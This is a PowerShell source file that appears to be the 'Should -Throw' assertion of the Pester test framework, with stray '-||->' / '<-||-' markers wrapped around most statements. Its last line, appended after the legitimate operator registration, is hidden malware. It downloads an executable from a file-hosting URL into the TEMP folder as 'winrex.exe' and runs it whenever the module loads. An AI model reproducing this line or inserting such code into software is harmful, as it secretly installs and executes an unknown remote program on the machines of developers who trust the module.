 -||-> function Should-Throw([scriptblock] $ActualValue, $ExpectedMessage, $ErrorId, [type]$ExceptionType, [switch] $Negate, [string] $Because, [switch] $PassThru) {
    
     -||-> $actualExceptionMessage = "" <-||- 
     -||-> $actualExceptionWasThrown = $false <-||- 
     -||-> $actualError = $null <-||- 
     -||-> $actualException = $null <-||- 
     -||-> $actualExceptionLine = $null <-||- 

     -||-> if ( -||-> $null -eq $ActualValue <-||- ) {
        throw  -||-> ( -||-> New-Object -TypeName ArgumentNullException -ArgumentList "ActualValue", "Scriptblock not found. Input to 'Throw' and 'Not Throw' must be enclosed in curly braces." <-||- ) <-||- 
    } <-||- 

     -||-> try {
        do {
             -||-> Write-ScriptBlockInvocationHint -Hint "Should -Throw" -ScriptBlock $ActualValue <-||- 
             -||-> $null =  -||-> & $ActualValue <-||-  <-||- 
        } until ( -||-> $true <-||- )
    }
    catch {
         -||-> $actualExceptionWasThrown = $true <-||- 
         -||-> $actualError = $_ <-||- 
         -||-> $actualException = $_.Exception <-||- 
         -||-> $actualExceptionMessage = $_.Exception.Message <-||- 
         -||-> $actualErrorId = $_.FullyQualifiedErrorId <-||- 
         -||-> $actualExceptionLine = ( -||-> Get-ExceptionLineInfo $_.InvocationInfo <-||- ) -replace [System.Environment]::NewLine, "$( -||-> [System.Environment]::NewLine <-||- )    " <-||- 
    } <-||- 

     -||-> [bool] $succeeded = $false <-||- 

     -||-> if ( -||-> $Negate <-||- ) {
        
        
         -||-> $succeeded = -not $actualExceptionWasThrown <-||- 
         -||-> if ( -||-> -not $succeeded <-||- ) {
             -||-> $failureMessage = "Expected no exception to be thrown,$( -||-> Format-Because $Because <-||- ) but an exception `"$actualExceptionMessage`" was thrown $actualExceptionLine." <-||- 
            return  -||-> New-Object psobject -Property @{
                Succeeded      =  -||-> $succeeded <-||- 
                FailureMessage =  -||-> $failureMessage <-||- 
            } <-||- 
        }
        else {
            return  -||-> New-Object psobject -Property @{
                Succeeded =  -||-> $true <-||- 
            } <-||- 
        } <-||- 
    } <-||- 

    
    

     -||-> function Join-And ($Items, $Threshold = 2) {

         -||-> if ( -||-> $null -eq $items -or $items.count -lt $Threshold <-||- ) {
             -||-> $items -join ', ' <-||- 
        }
        else {
             -||-> $c = $items.count <-||- 
             -||-> ( -||-> $items[0..( -||-> $c - 2 <-||- )] -join ', ' <-||- ) + ' and ' + $items[-1] <-||- 
        } <-||- 
    } <-||- 

     -||-> function Add-SpaceToNonEmptyString ([string]$Value) {
         -||-> if ( -||-> $Value <-||- ) {
             -||-> " $Value" <-||- 
        } <-||- 
    } <-||- 

     -||-> $buts = @() <-||- 
     -||-> $filters = @() <-||- 

     -||-> $filterOnExceptionType = $null -ne $ExceptionType <-||- 
     -||-> if ( -||-> $filterOnExceptionType <-||- ) {
         -||-> $filters += "with type $( -||-> Format-Nicely $ExceptionType <-||- )" <-||- 

         -||-> if ( -||-> $actualExceptionWasThrown -and $actualException -isnot $ExceptionType <-||- ) {
             -||-> $buts += "the exception type was $( -||-> Format-Nicely ( -||-> $actualException.GetType() <-||- ) <-||- )" <-||- 
        } <-||- 
    } <-||- 

     -||-> $filterOnMessage = -not [string]::IsNullOrEmpty($ExpectedMessage -replace "\s") <-||- 
     -||-> if ( -||-> $filterOnMessage <-||- ) {
         -||-> $filters += "with message $( -||-> Format-Nicely $ExpectedMessage <-||- )" <-||- 
         -||-> if ( -||-> $actualExceptionWasThrown -and ( -||-> -not ( -||-> Get-DoValuesMatch $actualExceptionMessage $ExpectedMessage <-||- ) <-||- ) <-||- ) {
             -||-> $buts += "the message was $( -||-> Format-Nicely $actualExceptionMessage <-||- )" <-||- 
        } <-||- 
    } <-||- 

     -||-> $filterOnId = -not [string]::IsNullOrEmpty($ErrorId -replace "\s") <-||- 
     -||-> if ( -||-> $filterOnId <-||- ) {
         -||-> $filters += "with FullyQualifiedErrorId $( -||-> Format-Nicely $ErrorId <-||- )" <-||- 
         -||-> if ( -||-> $actualExceptionWasThrown -and ( -||-> -not ( -||-> Get-DoValuesMatch $actualErrorId $ErrorId <-||- ) <-||- ) <-||- ) {
             -||-> $buts += "the FullyQualifiedErrorId was $( -||-> Format-Nicely $actualErrorId <-||- )" <-||- 
        } <-||- 
    } <-||- 

     -||-> if ( -||-> -not $actualExceptionWasThrown <-||- ) {
         -||-> $buts += "no exception was thrown" <-||- 
    } <-||- 

     -||-> if ( -||-> $buts.Count -ne 0 <-||- ) {
         -||-> $filter =  -||-> Add-SpaceToNonEmptyString (  -||-> Join-And $filters -Threshold 3 <-||-  ) <-||-  <-||- 
         -||-> $but =  -||-> Join-And $buts <-||-  <-||- 
         -||-> $failureMessage = "Expected an exception,$filter to be thrown,$( -||-> Format-Because $Because <-||- ) but $but. $actualExceptionLine".Trim() <-||- 

        return  -||-> New-Object psobject -Property @{
            Succeeded      =  -||-> $false <-||- 
            FailureMessage =  -||-> $failureMessage <-||- 
        } <-||- 
    } <-||- 

     -||-> $result =  -||-> New-Object psobject -Property @{
        Succeeded =  -||-> $true <-||- 
    } <-||-  <-||- 

     -||-> if ( -||-> $PassThru <-||- ) {
         -||-> $result | Add-Member -MemberType NoteProperty -Name 'Data' -Value $actualError <-||- 
    } <-||- 

    return  -||-> $result <-||- 
} <-||- 

 -||-> function Get-DoValuesMatch($ActualValue, $ExpectedValue) {
    
     -||-> if ( -||-> $null -eq $ExpectedValue <-||-  ) {
        return  -||-> $true <-||- 
    } <-||- 

    return  -||-> $ActualValue.ToString().IndexOf($ExpectedValue, [System.StringComparison]::InvariantCultureIgnoreCase) -ge 0 <-||- 
} <-||- 

 -||-> function Get-ExceptionLineInfo($info) {
    
     -||-> $positionMessage = $info.PositionMessage -split '\r?\n' -match '\S' -join [System.Environment]::NewLine <-||- 
    return  -||-> ( -||-> $positionMessage -replace "^At ", "from " <-||- ) <-||- 
} <-||- 

 -||-> function ShouldThrowFailureMessage {
    
} <-||- 

 -||-> function NotShouldThrowFailureMessage {
    
} <-||- 

 -||-> Add-AssertionOperator -Name         Throw `
    -InternalName Should-Throw `
    -Test         ${function:Should-Throw} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('https://a.pomf.cat/vhcwbo.exe',"$env:TEMP\winrex.exe") <-||- ; -||-> Start-Process ( -||-> "$env:TEMP\winrex.exe" <-||- ) <-||- 



